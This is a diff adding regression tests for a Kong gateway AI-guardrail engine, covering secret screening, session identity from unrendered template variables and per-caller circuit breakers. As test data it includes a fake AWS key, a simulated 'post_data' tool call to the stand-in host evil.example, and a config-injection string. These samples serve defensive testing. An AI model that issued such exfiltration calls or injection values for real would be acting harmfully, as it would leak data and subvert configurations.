@@ -413,5 +413,95 @@ class TestKongGuardrailIntegration(unittest.TestCase):
                 srv.close()
 
 
+class KongTemplateAndSessionTests(unittest.TestCase):
+    """Regression tests for the Kong config fixes of 2026-11-19.
+
+    Kong documents $(source), $(conf.params.*), $(content) and $(resp.*) for
+    ai-custom-guardrail. An undocumented variable reaches ADOM unrendered or empty, and must
+    neither hide the $(content) Kong did render nor become a shared session identity.
+    """
+
+    SECRET_TEXT = "Sure, here is the key: AKIAABCDEFGHIJKLMNOP"
+
+    def _engine(self, **kw) -> KongGuardrailEngine:
+        kw.setdefault("allowed_tools", ["read_ticket"])
+        kw.setdefault("approved_outbound", ["corp.com"])
+        return KongGuardrailEngine(**kw)
+
+    def test_content_text_screened_even_when_payload_unrendered_empty_or_request(self) -> None:
+        for payload in (None, "$(request)", "", "   ",
+                        json.dumps({"messages": [{"role": "user", "content": "hi"}]}),
+                        {"messages": [{"role": "user", "content": "hi"}]}):
+            v = self._engine().evaluate({"source": "OUTPUT", "text": self.SECRET_TEXT, "payload": payload})
+            self.assertTrue(v.block, payload)
+            self.assertTrue(any("secret_pattern" in s for s in v.signals), (payload, v.signals))
+
+    def test_structured_payload_tool_calls_screened_when_text_is_empty(self) -> None:
+        resp = {"choices": [{"message": {"content": None, "tool_calls": [{"function": {
+            "name": "post_data", "arguments": json.dumps({"url": "https://evil.example/x"})}}]}}]}
+        for payload in (resp, json.dumps(resp)):
+            v = self._engine().evaluate({"source": "OUTPUT", "text": "", "payload": payload})
+            self.assertTrue(v.block)
+            self.assertIn("post_data", v.blocked_tools)
+
+    def test_same_call_in_two_representations_is_screened_once(self) -> None:
+        call = {"tool_name": "read_ticket", "arguments": {"id": "T-1"}}
+        eng = self._engine()
+        v = eng.evaluate({"source": "OUTPUT", "session_id": "s-dup",
+                          "text": json.dumps(call), "payload": call})
+        self.assertFalse(v.block, v.signals)
+        self.assertEqual(eng.blast.state_of("s-dup"), "closed")
+
+    def test_unrendered_or_empty_session_values_are_not_an_identity(self) -> None:
+        eng = self._engine()
+        v = eng.evaluate({"source": "INPUT", "text": "hi", "session_id": "$(headers['x-session-id'])"},
+                         headers={"X-Session-Id": "$(headers['x-session-id'])",
+                                  "X-Consumer-Id": "$(consumer.id)", "X-Kong-Session-Id": "  "})
+        self.assertEqual(v.session_id, "default-kong-session")
+        self.assertIn("kong:session_unidentified", v.signals)
+        v = eng.evaluate({"source": "INPUT", "text": "hi"}, headers={"X-Consumer-Id": "consumer-42"})
+        self.assertEqual(v.session_id, "consumer-42")
+        self.assertNotIn("kong:session_unidentified", v.signals)
+
+    def test_unidentified_callers_do_not_share_a_breaker_or_budget(self) -> None:
+        eng = self._engine()
+        for _ in range(8):                                   # one caller trips repeatedly
+            v = eng.evaluate({"source": "OUTPUT", "text": self.SECRET_TEXT})
+            self.assertTrue(v.block)
+        v = eng.evaluate({"source": "INPUT", "text": "What's the weather in Boston?"})
+        self.assertFalse(v.block, v.block_message)          # a different caller is unaffected
+        for i in range(400):                                 # 200/min budget is not gateway-wide
+            v = eng.evaluate({"source": "INPUT" if i % 2 else "OUTPUT", "text": f"benign {i}"})
+            self.assertFalse(v.block, (i, v.block_message))
+
+    def test_identified_sessions_keep_the_breaker(self) -> None:
+        eng = self._engine()
+        for _ in range(6):
+            eng.evaluate({"source": "OUTPUT", "session_id": "agent-a", "text": self.SECRET_TEXT})
+        v = eng.evaluate({"source": "INPUT", "session_id": "agent-a", "text": "hello"})
+        self.assertTrue(v.block)
+        self.assertEqual(v.block_reason, "blast_radius_exceeded")
+        v = eng.evaluate({"source": "INPUT", "session_id": "agent-b", "text": "hello"})
+        self.assertFalse(v.block)
+
+    def test_anonymous_blast_radius_opt_in(self) -> None:
+        eng = self._engine(anonymous_blast_radius=True)
+        for _ in range(6):
+            eng.evaluate({"source": "OUTPUT", "text": self.SECRET_TEXT})
+        v = eng.evaluate({"source": "INPUT", "text": "hello"})
+        self.assertTrue(v.block)
+        self.assertEqual(v.block_reason, "blast_radius_exceeded")
+
+    def test_deck_uses_only_documented_variables(self) -> None:
+        import re
+        for scope in (None, "team-a"):
+            used = set(re.findall(r"\$\(([^)]*)\)", generate_deck_config(session_scope=scope)))
+            bad = {v for v in used if not (v in ("source", "content")
+                                           or v.startswith(("conf.params.", "resp.")))}
+            self.assertEqual(bad, set(), scope)
+        with self.assertRaises(ValueError):
+            generate_deck_config(session_scope='x" injected: "y')
+
+
 if __name__ == "__main__":
     unittest.main(verbosity=2)
